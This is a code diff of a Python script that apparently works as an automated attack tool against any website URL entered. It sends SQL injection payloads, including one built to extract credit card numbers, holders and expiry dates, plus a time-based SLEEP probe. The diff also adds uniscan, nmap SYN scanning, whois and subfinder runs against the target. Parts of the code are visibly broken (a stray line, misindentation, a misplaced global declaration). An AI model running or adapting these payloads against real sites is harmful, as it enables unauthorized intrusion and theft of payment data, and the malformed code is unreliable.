@@ -85,7 +85,7 @@ def check_website_status(url):
         print(f"An error occurred: {e}")
         return False
 
-def perform_sql_injection(target_url):
+def perform_sql_injection(target_url, result_dir):
     """Perform SQL Injection using the provided payloads."""
     payloads = [
         "' OR 1=1 UNION SELECT cc_number, cc_holder, cc_expiration FROM credit_cards --",
@@ -105,7 +105,8 @@ def perform_sql_injection(target_url):
         "SELECT * FROM products WHERE name LIKE '%user_input%';",
         "SELECT * FROM products WHERE name LIKE '%admin%' AND SLEEP(5);"
     ]
-
+    
+    file_count = 1
     for payload in payloads:
         data = {
             'username': f'admin{payload}',
@@ -115,18 +116,26 @@ def perform_sql_injection(target_url):
         try:
             response = requests.post(target_url, data=data, verify=False)  # Disabling SSL verification
             if "error" in response.text.lower():
-                print
-                            if "error" in response.text.lower():
                 result = f"Payload: {payload} might cause an error"
             else:
-                result = f"Payload: {payload} - Response: {response.text}"
-            save_to_file(output_file, result)  # Save the results in the file
+                                result = f"Payload: {payload} - Response: {response.text}"
+            # Save results in a file within the results directory
+            result_file = os.path.join(result_dir, f"{file_count}.txt")
+            with open(result_file, 'w') as file:
+                file.write(result)
+            file_count += 1
         except SSLError as e:
             result = f"SSL Error: {e}"
-            save_to_file(output_file, result)  # Save the error message in the file
+            result_file = os.path.join(result_dir, f"{file_count}.txt")
+            with open(result_file, 'w') as file:
+                file.write(result)
+            file_count += 1
         except RequestException as e:
             result = f"Request Error: {e}"
-            save_to_file(output_file, result)  # Save the error message in the file
+            result_file = os.path.join(result_dir, f"{file_count}.txt")
+            with open(result_file, 'w') as file:
+                file.write(result)
+            file_count += 1
 
 def create_results_directory():
     """Create a results directory on the Desktop with a timestamp."""
@@ -141,7 +150,7 @@ def main():
     clear_screen()
     print_header()
     
-    target_url = input("Enter the URL of the website to check: ")
+    target_url = input("Enter the URL of the website to check: ").strip()
     
     # Create results directory on the Desktop
     results_dir = create_results_directory()
@@ -154,20 +163,66 @@ def main():
     
     # Perform SQL Injection scan
     print("Performing SQL Injection scan...")
-    global output_file
-    output_file = os.path.join(results_dir, "1_sql_injection_results.txt")
-    perform_sql_injection(target_url)
+    perform_sql_injection(target_url, results_dir)
     
-    # You can add other scan functions here if needed
-    
+    # Run uniscan
+    print("Running uniscan...")
+    stdout, stderr = run_command(["uniscan", "-u", target_url, "-qweds"])
+    uniscan_file = os.path.join(results_dir, f"{file_count}.txt")
+    with open(uniscan_file, 'w') as file:
+        file.write("Uniscan output:\n")
+        file.write(stdout)
+        if stderr:
+            file.write("Uniscan errors:\n")
+            file.write(stderr)
+    global file_count
+    file_count += 1
+
+    # Run nmap scan
+    print("Running nmap scan...")
+    stdout, stderr = run_command(["nmap", "-sS", "-sV", "-T4", target_url])
+    nmap_file = os.path.join(results_dir, f"{file_count}.txt")
+    with open(nmap_file, 'w') as file:
+        file.write("Nmap output:\n")
+        file.write(stdout)
+        if stderr:
+            file.write("Nmap errors:\n")
+            file.write(stderr)
+    file_count += 1
+
+    # Run whois lookup
+    print("Running whois lookup...")
+    stdout, stderr = run_command(["whois", target_url])
+    whois_file = os.path.join(results_dir, f"{file_count}.txt")
+    with open(whois_file, 'w') as file:
+        file.write("Whois output:\n")
+        file.write(stdout)
+        if stderr:
+            file.write("Whois errors:\n")
+            file.write(stderr)
+    file_count += 1
+
+    # Run subfinder
+    print("Running subfinder...")
+    stdout, stderr = run_command(["subfinder", "-d", target_url])
+    subfinder_file = os.path.join(results_dir, f"{file_count}.txt")
+    with open(subfinder_file, 'w') as file:
+        file.write("Subfinder output:\n")
+        file.write(stdout)
+        if stderr:
+            file.write("Subfinder errors:\n")
+            file.write(stderr)
+    file_count += 1
+
     # Final message
     print("Scan completed.")
-    with open(os.path.join(results_dir, "scan_summary.txt"), 'w') as f:
+    summary_file = os.path.join(results_dir, "scan_summary.txt")
+    with open(summary_file, 'w') as f:
         f.write("Scan completed by Haggar\n")
     
     print("Scan results saved. Check the 'ScanResults' folder on your Desktop.")
 
 if __name__ == "__main__":
+    file_count = 1  # Initialize file count
+    install_tools()
     main()
-        
-        
